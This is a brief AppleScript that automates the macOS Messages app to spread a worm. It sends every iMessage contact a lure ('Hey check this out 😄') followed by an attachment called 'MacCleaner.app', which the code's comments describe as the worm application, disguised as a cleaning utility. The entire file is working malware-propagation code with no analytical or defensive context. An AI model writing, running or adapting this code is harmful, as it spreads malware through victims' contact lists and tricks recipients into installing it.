-- Open the Messages application
tell application "Messages"
	-- Use the first iMessage account/service
	set targetService to 1st service whose service type = iMessage
	-- Get the list of all buddies (contacts)
	set buddyList to buddies of targetService
	
	-- Loop over each buddy and send messages
	repeat with b in buddyList
		-- Send a bait message
		send "Hey check this out 😄" to b
		-- Send the worm application as an attachment
		send file "MacCleaner.app" to b
	end repeat
end tell
